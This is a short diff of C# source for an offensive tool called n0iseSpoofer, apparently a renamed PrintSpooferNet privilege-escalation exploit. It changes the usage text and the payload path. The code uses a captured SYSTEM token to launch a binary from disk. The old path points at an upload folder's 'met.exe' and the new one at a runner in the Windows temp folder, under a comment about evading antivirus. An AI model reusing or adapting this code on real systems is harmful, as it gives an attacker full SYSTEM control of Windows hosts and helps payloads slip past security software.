@@ -91,7 +91,7 @@ namespace n0iseSpoofer
         {
             if (args.Length == 0)
             {
-                Console.WriteLine("Usage: PrintSpooferNet.exe pipename");
+                Console.WriteLine("Usage:n0iseSpoofer.exe pipename");
                 return;
             }
             string pipeName = args[0];
@@ -133,7 +133,7 @@ namespace n0iseSpoofer
             si.lpDesktop = "WinSta0\\Default";
 
             //binary is on disk, so it must evade AV!
-            res = CreateProcessWithTokenW(hSystemToken, LogonFlags.WithProfile, null, "C:\\inetpub\\wwwroot\\Upload\\met.exe", CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
+            res = CreateProcessWithTokenW(hSystemToken, LogonFlags.WithProfile, null, "C:\\Windows\\temp\\n0iseCsharpRunner.exe", CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
 
         }
     }
